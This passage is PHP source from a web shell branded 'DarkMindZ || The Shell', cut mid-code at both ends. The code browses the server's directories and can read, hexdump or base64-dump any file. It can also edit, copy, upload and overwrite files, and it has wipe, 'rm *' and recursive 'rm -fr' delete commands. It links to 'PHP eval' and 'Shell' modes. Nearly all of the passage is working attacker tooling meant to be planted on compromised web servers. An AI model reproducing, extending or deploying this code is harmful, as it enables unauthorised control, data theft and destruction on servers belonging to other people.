      if ($name=="." || $name=="..") continue;
      if (@is_dir($d.$name)) {
         $dirs[]=strval($name);
         $fstatus[$name]=0;
      }
      else {
         $files[]=strval($name);
         $fstatus[$name]=1;
      }
      $fsize[$name]=@filesize($d.$name);
      $ftype[$name]=@filetype($d.$name);
      if (!is_int($fsize[$name])) { $ftype[$name]='?'; $fstatus[$name]=1; }
      $fperms[$name]=@fileperms($d.$name);
      $fmtime[$name]=@filemtime($d.$name);
      $fatime[$name]=@fileatime($d.$name);
      $fctime[$name]=@filectime($d.$name);
      $fowner[$name]=@fileowner($d.$name);
      $fgroup[$name]=@filegroup($d.$name);
      if (preg_match("!^[^.].*\.([^.]+)$!",$name,$ok))
         $fext[$name]=strtolower($ok[1]);
      else
         $fext[$name]="";
   }
   $di->close();

   $listsort=array();
   if (count($dirs))
   foreach ($dirs as $v) {
       switch ($cc[0]) {
          case "e": $listsort[$v]=$fext[$v].' '.$v; break;
          case "n": $listsort[$v]=strtolower($v); break;
          default:
             switch ($cn[$cc[0]]) {
                case "t": case "s": case "n": $listsort[$v]=strtolower($v); break;
                case "o": $listsort[$v]=$fowner[$v]; break;
                case "g": $listsort[$v]=$fgroup[$v]; break;
                case "a": $listsort[$v]="$fowner[$v] $fgroup[$v]"; break;
                case "c": $listsort[$v]=$fperms[$v]; break;
                case "1": $listsort[$v]=$fctime[$v]; break;
                case "2": $listsort[$v]=$fmtime[$v]; break;
                case "3": $listsort[$v]=$fatime[$v]; break;

             }
      }
   }

   $names=$listsort;
   //echo "<pre>";print_r($names);
   if ($cc[1]) arsort($names); else asort($names);
   //echo "<pre>";print_r($names);

   $listsort=array();
   if (count($files))
   foreach ($files as $v) {
       $v=strval($v);
       switch ($cc[0]) {
          case "e": $listsort[$v]=$fext[$v].' '.$v; break;
          case "n": $listsort[$v]=strtolower($v); break;
          default:
             switch ($cn[$cc[0]]) {
                case "n": $listsort[$v]=strtolower($v); break;
                case "t": $listsort[$v]=$ftype[$v]; break;
                case "s": $listsort[$v]=$fsize[$v]; break;
                case "o": $listsort[$v]=$fowner[$v]; break;
                case "g": $listsort[$v]=$fgroup[$v]; break;
                case "a": $listsort[$v]="$fowner[$v] $fgroup[$v]"; break;
                case "c": $listsort[$v]=$fperms[$v]; break;
                case "1": $listsort[$v]=$fctime[$v]; break;
                case "2": $listsort[$v]=$fmtime[$v]; break;
                case "3": $listsort[$v]=$fatime[$v]; break;

             }
      }
   }


   //echo "<pre>DIRS:"; print_r($names);
   if ($cc[1]) arsort($listsort); else asort($listsort);
   //$names=array_merge($names,$listsort);
   foreach ($listsort as $k=>$v) $names[$k]=$v;
   //echo "<pre>FILES:"; print_r($listsort);
   //echo "<pre>NAMES:"; print_r($names);

?>
          <STYLE>
.title {
color: 'black';
background: #D4D0C8;
text-align: 'center';
BORDER-RIGHT:   #888888 1px outset;
BORDER-TOP:     #ffffff 2px outset;
BORDER-LEFT:    #ffffff 1px outset;
BORDER-BOTTOM:  #888888 1px outset;
}
.window {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
FONT: 8pt Tahoma, Verdana, Geneva, Arial, Helvetica, sans-serif;
BACKGROUND-COLOR: #D4D0C8;
CURSOR: default;
}
.window1 {
BORDER-RIGHT:  #eeeeee 1px solid;
BORDER-TOP:    #808080 1px solid;
BORDER-LEFT:   #808080 1px solid;
BORDER-BOTTOM: #eeeeee 1px solid;
FONT: 8pt Tahoma, Verdana, Geneva, Arial, Helvetica, sans-serif;
}
.line {
BORDER-RIGHT:   #cccccc 1px solid;
BORDER-TOP:     #ffffff 1px solid;
BORDER-LEFT:    #ffffff 1px solid;
BORDER-BOTTOM:  #cccccc 1px solid;
font: <?php echo $cp[4]; ?>pt <?php echo $cp[3]; ?>;
}
.line2 {
background: #ffffcc;
}
.black {color: black}
a:link.black {color: black}
a:active.black {color: black}
a:visited.black {color: black}
a:hover.black {color: #0000ff}

.windowtitle {
font: 9pt; Tahoma, Verdana, Geneva, Arial, Helvetica, sans-serif;
font-weight: bold;
color: lime;
}
.sym {
font: 14px Wingdings;
}
</STYLE> 
          <?php

function up2($d) {
   global $win,$self;
   $d=str_replace("\\","/",$d);
   if (substr($d,-1)!="/") $d.="/";
   $d=str_replace("//","/",$d);

   $n=explode("/",$d);
   unset($n[count($n)-1]);

   $path="";
   for ($i=0; $i<count($n); $i++) {
      $path="$path$n[$i]/";
      if ($i==0) $path=strtoupper($path);
      $paths[]=$path;
   }

   $out="";
   $sum=0;
   $gr=70;
   for ($i=0; $i<count($n); $i++) {
      $out.="<a href=$self?c=l&d=".urlencode($paths[$i])." class=white>";
      if (strlen($d)>$gr && $i>0 && $i+1<count($n)) {
         if (strlen($d)-$sum>$gr) {
            $out.="••";
            $sum+=strlen($n[$i]);
         }
         else
            $out.=$n[$i];
      }
      else
         if ($i==0) $out.=strtoupper($n[$i]); else $out.=$n[$i];
      $out.="/</a>";

   }

   return $out;
   return "<font size=-2>$d</font>";
}

$ext=array();
$ext['html']=array('html','htm','shtml');
$ext['txt']=array('txt','ini','conf','','bat','sh','tcl','js','bak','doc','log','sfc','c','cpp','h','cfg');
$ext['exe']=array('exe','com','pif','src','lnk');
$ext['php']=array('php','phtml','php3','php4','inc');
$ext['img']=array('gif','png','jpeg','jpg','jpe','bmp','ico','tif','tiff','avi','mpg','mpeg');
$ext['zip']=array('zip','rar','gz');


   echo "\n\n\n<script>\nfunction tr(";
   for ($i=0; $i<strlen($cn); $i++) {
      echo "a$i,";
   }
   echo "x) {\ndocument.write(\"<tr bgcolor=black";
   echo " onMouseOver='this.style.backgroundColor=\\\"grey\\\"' onMouseOut='this.style.backgroundColor=\\\"\\\"'>";
   for ($i=0; $i<strlen($cn); $i++) {
      echo '<td align='.$cn_align[$cn[$i]].' class=line ';
      switch ($cn[$i])  {
         case 's': case 'c':  case '1':  case '2':  case '3': case 't':
            echo ' nowrap';
      }
      echo ">";
      if ($cn[$i]!='t' && $cn[$i]!='n') echo "\xA0";
      echo "\"+a$i+\"";
      if ($cn[$i]!='t' && $cn[$i]!='n') echo "\xA0";
      echo "</td>";
   }
   echo "</tr>\");\n}";
   echo "\n\n</script>\n\n\n";


   //phpinfo();
   //echo implode(" | ",$cp);
   echo '<table border=0 cellspacing=2 cellpadding=0 bgcolor="black"
      class=window align=center width=60%><form name=main>';

   echo '<tr><td colspan='.strlen($cn).' bgcolor="black" background="" class=windowtitle>';

         echo '<table width=100% border=0 cellspacing=0 cellpadding=2 class=windowtitle><tr><td>'.
         '<a href='.$self.'>Home </a>'.
         up2($d.$f).'</td></tr></table>';

   echo '</td></tr>'.
   '<tr><td>'.
   '<table width=100% border=0 cellspacing=0 cellpadding=0 class=window1><tr>';

   $button_help=array(
   'up'=>"UP DIR",
   'refresh'=>"RELOAD",
   'setup'=>'SETUP, folder option',
   'edit'=>'DIR INFO',
   'home'=>'HomePage',
   'papki'=>'TREE',
   'mode'=>'PHP eval, Shell',
   'back'=>'BACK',
   );

   function button_url($name) {
      global $self,$d,$f,$uurl;
      switch ($name) {
         case 'up': return "$self?c=l&d=".urlencode(realpath($d.".."));
         case 'refresh': return "$self?c=l&r=".rand(0,10000)."&d=".urlencode($d);
         case 'setup': return "$self?c=setup&ref=$uurl";
         case 'edit': return "$self?c=d&d=".urlencode($d);
         case 'home': return "http://www.darkmindz.com";
         case 'papki': return "$self?c=tree&d=".urlencode($d);
         case 'mode': return "$self?c=t";
         case 'back': return "javascript:history.back(-1)";
      }
   }
   echo '<td colspan='.strlen($cn).'>
   <table border=0 cellspacing=0 cellpadding=2><tr>';
   $buttons=array('back','up','refresh','edit','mode','disk','full','papki','setup','home');
   $tmp=strtoupper($d[0]);
   for ($i=0; $i<count($buttons); $i++) {
      if ($buttons[$i]=='full') {
         echo '<td class=window width=90% align=center nowrap><font color=#33312 face="Arial Black"
         style="font-size: 11pt;">--= DarkMindZ || File Manager =--</font></td>';
         continue;
      }
      if ($buttons[$i]=='disk') {
         if (!$win) continue;
         echo '<td width=1% title=\'Select dist\' class=window onMouseOver="this.style.backgroundColor=\'#333333\'" '.
              ' onMouseOut="this.style.backgroundColor=\'\'">';
         echo "<select name=disk size=1; style='font: 9pt Arial Black; color: #33322 '
         onChange='location.href=\"$self?c=l&d=\"+document.main.disk.options[document.main.disk.selectedIndex].value+\":/\"'>";
         for ($j=ord('A'); $j<=ord('Z'); $j++)
            echo '<option value="'.chr($j).'"'.(chr($j)==$tmp?" selected":"").'>'.chr($j);
         echo "</select></td>";
         continue;
      }
      $bturl=button_url($buttons[$i]);
      echo '<td width=1% title=\''.$button_help[$buttons[$i]].'\' class=window'.
           ' onMouseMove="this.style.backgroundColor=\'#333311\';window.status=\'** '.$button_help[$buttons[$i]].' ** '.$bturl.'\'"'.
           ' onMouseOut="this.style.backgroundColor=\'\';window.status=\'\'"'.
           ' onClick=\'location.href="'.$bturl.'"\'><a href=';
      echo button_url($buttons[$i]);
      echo '>'.$buttons[$i].'</a></td>';
   }
   echo '</tr></table>
   </td></tr><tr>';


   for ($i=0; $i<strlen($cn); $i++) {
      echo "<td nowrap class=title onClick='location.href=\"".
           "$self?c=set&c2=sort&name=$i&pan=$panel&ref=$uurl\"'";
      switch ($cn[$i]) {
         case 1: case 2: case 3: case "s": echo " width=13%"; break;
         case 't': echo " width=2%"; break;
         case 'n': echo " width=40%"; break;
      }
      echo "><a href='$self?c=set&c2=sort&name=$i&pan=$panel&ref=$uurl' class=black>";
      switch ($cn[$i]) {
         case "n": case "t": case "s": case "o": case "g":
         case "a": case "c": case "1": case "2": case "3":
            echo "\xA0".$cn_name[$cn[$i]]."\xA0"; break;
         default:
            echo "??$cn[$i]??";
      }
      if ($cc[0]==="$i") {
         if ($cc[1]=='0') echo "Sort Asc.";
         else echo "Sort Dec.";
      }
      echo '</a></td>';
   }
   echo '</tr>';

   echo "\n\n<script>\n\n";
   foreach ($names as $k=>$v) {

      echo "\n\n// $k \n";
      echo 'tr(';

      for ($i=0; $i<strlen($cn); $i++) {

         switch ($cn[$i]) {

            case 'n':
               switch($ftype[$k]) {
               case 'file':
                  $vv=strtolower(substr($k,strlen($k)-4,4));
                  $add="";
                  if ($vv==".gif" || $vv==".jpg" || $vv==".png" || $vv==".bmp"
                     || $vv==".ico" || $vv=="jpeg") $add="&ftype=2&fnot=1";
                  if (substr($k,0,5)=="sess_") $add="&ftype=4";
                  $ln='<a href='.$self.'?&c=v&d='.urlencode($d).
                  '&f='.urlencode($k).$add.'>';
                  break;

               default:
                  $ln='<a href='.$self.'?&c=l&d='.urlencode($d.$k).'>';
                  break;
               }

               if ($ftype[$k]=='dir')
                  $ln.='';
               else {
                  $found=0;
                  foreach ($ext as $kk=>$vv) {
                     if (in_array(strtolower($fext[$k]),$vv)) {
                        $ln.= "$kk >>";
                        $found=1;
                        break;
                     }
                  }
                  if (!$found)
                     $ln.='=-   ';
               }
               $ln.=substr($k,0,48).'</a>';
               echo jsval($ln);

               break;

            case "t":
               switch ($ftype[$k]) {
               case "dir":
                  echo jsval("<a href=$self?c=d&d=".urlencode($d.$k).">DIR</a>");
                  break;
               case "file":
                  echo jsval("<a href=$self/".urlencode($k)."?&c=v&fnot=1&ftype=3&d=".
                     urlencode($d)."&f=".urlencode($k)." class=sym>\xF2</a> ".
                     "<a href=$self?&c=i&d=".urlencode($d)."&f=".urlencode($k)." class=sym>\xF0</a>");
                  break;
               case "link":
                  echo jsval("<font class=t>&#8212;&gt;</font>");
                  break;
               default:
                  echo jsval("??");
                  break;
               }
               break;

            case "s":
               if ($ftype[$k]=='file') echo jsval(sizeparse($fsize[$k]));
               else echo jsval('');
               break;

            case "o":
               $tmp=@_posix_getpwuid($fowner[$k]);
               if (!isset($tmp['name']) || $tmp['name']=="") $tow=$fowner[$k];
               else $tow=$tmp['name'];
               echo jsval($tow);
               break;

            case "g":
               $tmp2=@_posix_getgrgid($fgroup[$k]);
               if (!isset($tmp2['name']) || $tmp2['name']=="") $tgr=$fgroup[$k];
               else $tgr=$tmp2['name'];
               echo jsval($tgr);
               break;

            case "a":
               $tmp=@_posix_getpwuid($fowner[$k]);
               if (!isset($tmp['name']) || $tmp['name']=="") $tow=$fowner[$k];
               else $tow=$tmp['name'];
               $tmp2=@_posix_getgrgid($fgroup[$k]);
               if (!isset($tmp2['name']) || $tmp2['name']=="") $tgr=$fgroup[$k];
               else $tgr=$tmp2['name'];
               echo jsval("$tow/$tgr");
               break;

            case "c":
               echo jsval(display_perms($fperms[$k])); break;

            case "1": echo jsval(date($cp[2],$fctime[$k])); break;

            case "2": echo jsval(date($cp[2],$fmtime[$k])); break;

            case "3": echo jsval(date($cp[2],$fatime[$k])); break;

            default: echo "??$cn[$i]??";

         } //switch ($ftype)

      }//for ($cn)

      echo "0);\n";



   }//foreach ($names)

   echo "\n\n</script>\n\n\n";

   echo '</td></tr></table></td></tr></table></td></tr></table>';


   echo "<P align=center>
   <font size=1 style='Font: 8pt Verdana'><B>
   <a href=$self?c=setup&ref=$uurl>".mm("Setup")."</a> |
   <a href=$self?c=t>PHP eval</a> |
   <a href=$self?c=t>Shell</a> |
   <a href=$self?c=codes>".mm("Char map")."</a>
   </b><center>";

break;


case "set":

   switch ($c2) {
      case "sort":
         $name=intval($name);
         if ($name==$cc[0]) if ($cc[1]==='0') $cc[1]='1'; else $cc[1]='0';
         $cc[0]=$name;
         break;

      case "panel":
         $cn='';
         foreach ($names as $k=>$v) {
            if ($v!="") $cn.=substr($v,0,1);
         }
         $cc[0]=substr($sort,0,1);
         $cc[1]=substr($sortby,0,1);
         $cp[2]=substr($datetime,0,50);
         $cp[3]=substr($fontname,0,50);
         $cp[4]=substr($fontsize,0,50);

         break;

      case "eng":
         $cc[5]=1;
         break;

      case "rus":
         $cc[5]=2;
         break;

   }


   $cookie=$cc."~".$cn."~".$cp[2]."~".$cp[3]."~".$cp[4];
   if ($c2=="reset") $cookie=implode("~",$cp_def);
   setcookie("cp$pan",$cookie,time()+24*60*60*333,'/');
   header("Location: $ref");
   echo "<script>location.href=\"$ref\";</script>";
   //echo "[$ref]";
   //phpinfo();
   break;


case "setup":

   echo $GLOBALS['html'];

   echo "<center><h3><b>--= DarkMindZ || The Shell =--</b> &nbsp; [<A href='javascript:history.go(-1)'>".mm("back")."</a>]</h3></center><hr size=1 noshade>";

   echo "<STYLE>
   .setup {
      font-size: 8pt;

      font-family: Tahoma;
   }
   HTML, TD {font: 90%}
   </STYLE>";

   echo "
   <b><u>".mm("Reset all settings")."</u></b>: <a href=$self?c=set&c2=reset&pan=$panel&ref=$ref>".mm("clear")."</a>";
   echo " <font color=white>(".mm("Current").": <small>".implode(" | ",$cp)."</small>)</font><P>";

   echo "
   <form action=$self method=post>
   <input type=hidden name=c value=\"set\">
   <input type=hidden name=c2 value=\"panel\">
   <input type=hidden name=pan value=\"$panel\">
   <input type=hidden name=ref value=\"$ref\">
   ";
   echo "<b><u>".mm("Colums and sort")."</u></b><br>";

   echo "".mm("Sort order").": ";
   echo "<input type=radio name=sortby value=0 id=q3 ".($cc[1]=='0'?"checked":"").">";
   echo "<label for=q3>".mm("Ascending sort")."</label>";
   echo "<input type=radio name=sortby value=1 id=q4 ".($cc[1]=='1'?"checked":"").">";
   echo "<label for=q4>".mm("Descending sort")."</label><br>";

   echo "<input type=radio name=sort value='n' id=q1 ".($cc[0]=='n'?"checked":"").">";
   echo "<label for=q1>".mm("Sort by filename")."</label>";
   echo "<input type=radio name=sort value='e' id=q2 ".($cc[0]=='e'?"checked":"").">";
   echo "<label for=q2>".mm("Sort by filename extension")."</label>";
   echo "<table border=0 cellspacing=0 cellpadding=3>";
   for ($i=0; $i<2; $i++) {
      echo "<tr>";
      for ($j=0; $j<7; $j++) {
         $n=$j+$i*7;
         echo "<td align=center><label for=$n>Sort by ".($n+1)."</label>";
         echo "<input type=radio name=sort value=$n id=$n ".($cc[0]=="$n"?"checked":"").">";
         echo "<br><select class=setup name=names[] size=".(count($cn_name)+1).">";
         echo "<option value=''>--hidden--";
         foreach ($cn_name as $kk=>$vv)
            echo "<option value='$kk'".($n<strlen($cn) && $cn[$n]==$kk?" selected":"").">$vv";
         echo "</select>";
      }
      echo "</tr>";
   }
   echo "</table><P>";

   echo "<b><u>".mm("Date/time format")."</u></b>: <input type=text name=datetime value=\"$cp[2]\"><br>
   d - day, m - month, y - year2, Y - year4, H - hour, m - minute, s - second<P>";

   echo "<b><u>".mm("Panel font & size")."</u></b>:
   <input type=text name=fontname value=\"$cp[3]\" size=12>
   <input type=text name=fontsize value=\"$cp[4]\" size=2>pt<P>";

   echo "<P><center><input type=submit value='&nbsp; &nbsp; S &nbsp; U &nbsp; B &nbsp; M &nbsp; I &nbsp; T &nbsp; &nbsp;'></center></form>";


   echo "<hr size=1 noshade>";
   break;



// view
case "v":


   if (!isset($fnot)) $fnot=0;
   if (!isset($ftype)) $ftype=0;

   if ($fnot==0) {
      echo $GLOBALS['html'];
      up($d,$f);
      echo "<a href=$self?&c=l&d=".urlencode($d)."><nobr>&lt;&lt;&lt;<b>".mm("back to directory")."</b> &gt;&gt;&gt;</nobr></a>";
      up_link($d,$f);
      echo "<hr size=1 noshade>";
   }
   if (!realpath($d.$f) || !file_exists($d.$f)) exit("".mm("file not found")."");
   if (!is_file($d.$f) || !$fi=@fopen($d.$f,"rb")) exit("<p><font color=red><b>".mm("access denied")."</b></font>");

   if ($ftype==0 || $ftype==4) {
      $buf=fread($fi,max(filesize($d.$f),$maxsize_fread));
      fclose($fi);
   }


   switch ($ftype) {

   case 0:
      echo "<pre>".htmlspecialchars($buf)."</pre>";
      break;

   case 1:
      readfile($d.$f);
      break;

   case 2:
      header("Content-type: image/gif");
      readfile($d.$f);
      break;


   }

   break;

case "i": // information for FILE

   echo $GLOBALS['html'];
   up($d,$f);
   echo "<a href=$self?&c=l&d=".urlencode($d)."><nobr>&lt;&lt;&lt;<b>".mm("back to directory")."</b> &gt;&gt;&gt;</nobr></a>";
   up_link($d,$f);

   if (!realpath($d.$f) || !file_exists($d.$f)) exit(mm("file not found"));

   echo "<P><big><b><tt>".htmlspecialchars($d.$f)."</tt></b></big><P>";
   echo "<table class=tab border=0 cellspacing=1 cellpadding=2>";
   echo "<tr class=tr><td>".mm("Size")."        </td><td> ".filesize($d.$f)."</td></tR>";
   echo "<tr class=tr><td>".mm("Owner")."/".mm("Group")." </td><td> ";
   $tmp=@_posix_getpwuid(fileowner($d.$f));
   if (!isset($tmp['name']) || $tmp['name']=="") echo fileowner($d.$f)." ";
   else echo $tmp['name']." ";
   $tmp=@_posix_getgrgid(filegroup($d.$f));
   if (!isset($tmp['name']) || $tmp['name']=="") echo filegroup($d.$f);
   else echo $tmp['name'];
   echo "<tr class=tr><td>".mm("FileType")."    </td><td> ".filetype($d.$f)."</td></tr>";
   echo "<tr class=tr><td>".mm("Perms")."       </td><td> ".display_perms(fileperms($d.$f))."</td></tr>";
   echo "<tr class=tr><td>".mm("Create time")." </td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr>";
   echo "<tr class=tr><td>".mm("Access time")." </td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr>";
   echo "<tr class=tr><td>".mm("MODIFY time")." </td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr>";
   echo "</table><P>";

   $fi=@fopen($d.$f,"rb");
   if ($fi) {
      $str=fread($fi,$hexdump_lines*$hexdump_rows);
      echo "<b>".mm("HEXDUMP PREVIEW")."</b>";
      $n=0;
      $a0="00000000<br>";
      $a1="";
      $a2="";
      for ($i=0; $i<strlen($str); $i++) {
         $a1.=sprintf("%02X",ord($str[$i])).' ';
         switch (ord($str[$i])) {
            case 0:  $a2.="<font class=s2>0</font>"; break;
            case 32:
            case 10:
            case 13: $a2.="&nbsp;"; break;
            default:  $a2.=htmlspecialchars($str[$i]);
         }
         $n++;
         if ($n==$hexdump_rows) {
            $n=0;
            if ($i+1<strlen($str)) $a0.=sprintf("%08X",$i+1)."<br>";
            $a1.="<br>";
            $a2.="<br>";
         }
      }
      //if ($a1!="") $a0.=sprintf("%08X",$i)."<br>";
      echo "<table border=0 bgcolor=#33333 cellspacing=1 cellpadding=4 ".
         "class=sy><tr><td bgcolor=#33333>$a0</td><td bgcolor=#33333>".
         "$a1</td><td bgcolor=#33333>$a2</td></tr></table><p>";
   }

   echo "<b>Base64: </b>
   <nobr>[<a href=$self?c=base64&c2=0&d=".urlencode($d)."&f=".urlencode($f).">Encode</a>]&nbsp;</nobr>
   <nobr>[<a href=$self?c=base64&c2=1&d=".urlencode($d)."&f=".urlencode($f).">+chunk</a>]&nbsp;</nobr>
   <nobr>[<a href=$self?c=base64&c2=2&d=".urlencode($d)."&f=".urlencode($f).">+chunk+quotes</a>]&nbsp;</nobr>
   <nobr>[<a href=$self?c=base64&c2=3&d=".urlencode($d)."&f=".urlencode($f).">Decode</a>]&nbsp;</nobr>
   <P>";


   if (!$write_access) exitw();

   $msg="";
   if (!is_file($d.$f) || !$fi=@fopen($d.$f,"r+")) $msg=" (<font color=red><b>".mm("ONLY READ ACCESS")."</b></font>)";
   else fclose($fi);
   if (!is_file($d.$f) || !$fi=@fopen($d.$f,"r")) $msg=" (<font color=red><b>".mm("Can't READ file - access denied")."</b></font>)";
   else fclose($fi);
   if ($msg=="") $msg=" (".mm("full read/write access").")";

   echo "<b>".mm("FILE SYSTEM COMMANDS")."$msg</b><p>";

   echo "
<table border=0 cellspacing=0 cellpadding=0><tr>

<td bgcolor=#cccccc><a href=$self?c=e&d=".urlencode($d)."&f=".urlencode($f).
"><b>&nbsp;&nbsp;".mm("EDIT")."&nbsp;&nbsp;<br>&nbsp;&nbsp;".mm("FILE")."&nbsp;&nbsp;</b></a></td>
<td>&nbsp;&nbsp;&nbsp;</td>

<td><form action=$self method=post>
<input type=hidden name=c value=delete>
<input type=hidden name=c2 value=delete>
<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
<input type=hidden name=f value=\"".htmlspecialchars($f)."\">
<input type=submit value='".mm("DELETE")."'><small>&gt;</small><input type=checkbox name=confirm value=delete></nobr><br>
<small>".mm("Delete this file")."</small>
</td><td></form></td><td>&nbsp;&nbsp;&nbsp;</td>

<td><form action=$self method=post>
<input type=hidden name=c value=delete>
<input type=hidden name=c2 value=clean>
<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
<input type=hidden name=f value=\"".htmlspecialchars($f)."\">
<input type=submit value='".mm("CLEAN")."'><small>&gt;</small><input type=checkbox name=confirm value=touch></nobr><br>
<small>".mm("filesize to 0byte")."</small>
</td><td></form></td><td>&nbsp;&nbsp;&nbsp;</td>

<td><form action=$self method=post>
<input type=hidden name=c value=delete>
<input type=hidden name=c2 value=touch>
<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
<input type=hidden name=f value=\"".htmlspecialchars($f)."\">
<input type=submit value='".mm("TOUCH")."'><small>&gt;</small><input type=checkbox name=confirm value=touch></nobr><br>
<small>".mm("Set current 'mtime'")."</small>
</td><td></form></td><td>&nbsp;&nbsp;&nbsp;</td>

<td><form action=$self method=post>
<input type=hidden name=c value=delete>
<input type=hidden name=c2 value=wipe>
<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
<input type=hidden name=f value=\"".htmlspecialchars($f)."\">
<input type=submit value='".mm("WIPE(delete)")."'><small>&gt;</small><input type=checkbox name=confirm value=delete></nobr><br>
<small>".mm("Write '0000..' and delete")."</small>
</td><td></form></td><td>&nbsp;&nbsp;&nbsp;</td>
</tr></table>
";

   echo "<form action=$self method=post><input type=hidden name=c value=copy>".
        "<b>".mm("COPY FILE")."</b> ".mm("from")." <input type=text size=40 name=from value=\"".htmlspecialchars($d.$f)."\">".
        " ".mm("to")." <input type=text name=to size=40 value=\"".htmlspecialchars($d.$f)."\">".
        "<nobr><input type=submit value='".mm("COPY")."!'>".
        "&gt;<input type=checkbox name=confirm value=copy></nobr></form>";

echo "
<form action=$self method=post>
<b>".mm("MAKE DIR")."</b> (".mm("type full path").")
<input type=hidden name=c value=newdir_submit>
<input type=text size=60 name=df value=\"".htmlspecialchars($d)."\">
<input type=submit value='".mm("MkDir")."'>
</form>";


echo "
<form action=$self method=post>
<b>".mm("CREATE NEW FILE or override old file")."</b><br>
<input type=hidden name=c value=newfile_submit>
".mm("Full file name")." <input type=text size=50 name=df value=\"".htmlspecialchars($d.$f)."\">
<input type=submit value='".mm("CREATE/OVERRIDE")."'>
<input type=checkbox name=confirm value=1 id=conf1><label for=conf1>&lt;=confirm</label><br>
<textarea name=text cols=70 rows=10 style='width: 100%;'></textarea><br>
</form>";

echo "
<form enctype='multipart/form-data' action='$self' method=post>
<input type=hidden name=c value=fileupload_submit>
<b>FILE UPLOAD: ".mm("CREATE NEW FILE or override old file")."</b><br>
<input type=hidden name='MAX_FILE_SIZE' value=999000000>
1. ".mm("select file on your local computer").": <input name=userfile type=file><br>
2. ".mm("save this file on path").":
  <input name=df size=50 value=\"$d$f\"><br>
3. <input type=checkbox name=df2 value=1 id=df2 checked>
  <label for=df2>".mm("create file name automatic")."</label>
  &nbsp;&nbsp;".mm("OR")."&nbsp;&nbsp;
  ".mm("type any file name").":
  <input name=df3 size=20><br>
4. <input type=checkbox name=df4 value=1 id=df4>
  <label for=df4>".mm("convert file name to lovercase")."</label><br>
<input type=submit value='".mm("Send File")."'>
</form>";

break;


case "base64":

   echo "<pre>\n";
   $ff=fopen($d.$f,"rb") or exit("<p>access denied");
   $text=fread($ff,max(filesize($d.$f),$maxsize_fread));
   fclose($ff);
   switch ($c2) {
      case 0:
         echo base64_encode($text);
         break;
      case 1:
         echo chunk_split(base64_encode($text));
         break;
      case 2:
         $text=base64_encode($text);
         echo substr(preg_replace("!.{1,76}!","'\\0'.\n",$text),0,-2);
         break;
      case 3:
         echo base64_decode($text);
         break;
   }
   break;



case "d": // information for DIRECTORY

   echo $GLOBALS['html'];
   up($d,"","Directory");
   echo "<a href=$self?&c=l&d=".urlencode($d)."><nobr>&lt;&lt;&lt;<b>".mm("back to directory")."</b> &gt;&gt;&gt;</nobr></a>";
   echo "<p>";

   //up_link($d,"");

   if (!realpath($d) || !is_dir($d.$f)) exit(mm("dir not found"));

   echo "<table border=0 cellspacing=0 cellpadding=0><tr><td>";

   echo "<table border=0 cellspacing=1 cellpadding=1 class=tab>";
   echo "<tr class=tr><td>&nbsp;&nbsp;&nbsp;".mm("Owner")."/".mm("Group")."&nbsp;&nbsp;&nbsp;</td><td>";
   $tmp=@_posix_getpwuid(fileowner($d.$f));
   if (!isset($tmp['name']) || $tmp['name']=="") echo fileowner($d.$f)." ";
   else echo $tmp['name']." ";
   $tmp=@_posix_getgrgid(filegroup($d.$f));
   if (!isset($tmp['name']) || $tmp['name']=="") echo filegroup($d.$f);
   else echo $tmp['name'];
   echo "</td></tr><tr class=tr><td>";
   echo mm("Perms")."</td><td>".display_perms(fileperms($d.$f))."</td></tr><tr class=tr><td>";
   echo mm("Create time")."</td><td>".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr class=tr><td>";
   echo mm("Access time")."</td><td>".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr class=tr><td>";
   echo mm("MODIFY time")."</td><td>".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table>";

   echo "</tD><form action=$self method=get><td width=70>&nbsp;</td><td>
   <input type=hidden name=c value=\"tree\">
   Root <input type=text name=d value=\"$d\"><br>
   <input type=checkbox name=showfile value=1 id=tree1><label for=tree1>Show files in tree</label><br>
   <input type=checkbox name=showsize value=1 id=tree2 checked><label for=tree2>Show dir/files size</label><br>
   <input type=submit value='Show TREE directory'>";

   echo "</td></form></tr></table><P>";



   if (!$write_access) exitw();

   echo "<b>".mm("FILE SYSTEM COMMANDS")."</b><p>";

   echo "
<table border=0 cellspacing=0 cellpadding=0><tr>

<td><form action=$self method=post>
<input type=hidden name=c value=dirdelete>
<input type=hidden name=c2 value=files>
<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
<input type=hidden name=ref value=\"$url\">
<input type=submit value='".mm("Delete all files in dir")." (rm *)'><small>&gt;</small><input type=checkbox name=confirm value=delete></nobr>
</td><td></form></td><td>&nbsp;&nbsp;&nbsp;</td>

<td><form action=$self method=post>
<input type=hidden name=c value=dirdelete>
<input type=hidden name=c2 value=dir>
<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
<input type=hidden name=ref value=\"$url\">
<input type=submit value='".mm("Delete all dir/files recursive")." (rm -fr)'><small>&gt;</small><input type=checkbox name=confirm value=delete></nobr>
</td><td></form></td><td>&nbsp;&nbsp;&nbsp;</td>

</tr></table>
";

echo "
<form action=$self method=post>
<b>".mm("MAKE DIR")."</b> (type full path)
<input type=hidden name=c value=newdir_submit>
<input type=text size=60 name=df value=\"".htmlspecialchars($d)."\">
<input type=submit value='".mm("MkDir")."'>
</form>";


echo "
<form action=$self method=post>
<b>".mm("CREATE NEW FILE or override old file")."</b><br>
<input type=hidden name=c value=newfile_submit>
".mm("Full file name")." <input type=text size=50 name=df value=\"".htmlspecialchars($d)."\">
<input type=submit value='".mm("CREATE/OVERRIDE")."'>
<input type=checkbox name=confirm value=1 id=conf1><label for=conf1>&lt;=confirm</label><br>
<textarea name=text cols=70 rows=10 style='width: 100%;'></textarea><br>
</form>";

echo "
<form enctype='multipart/form-data' action='$self' method=post>
<input type=hidden name=c value=fileupload_submit>
<b>(FILE UPLOAD) ".mm("CREATE NEW FILE or override old file")."</b><br>
<input type=hidden name='MAX_FILE_SIZE' value=999000000>
1. ".mm("select file on your local computer").": <input name=userfile type=file><br>
2. ".mm("save this file on path").":
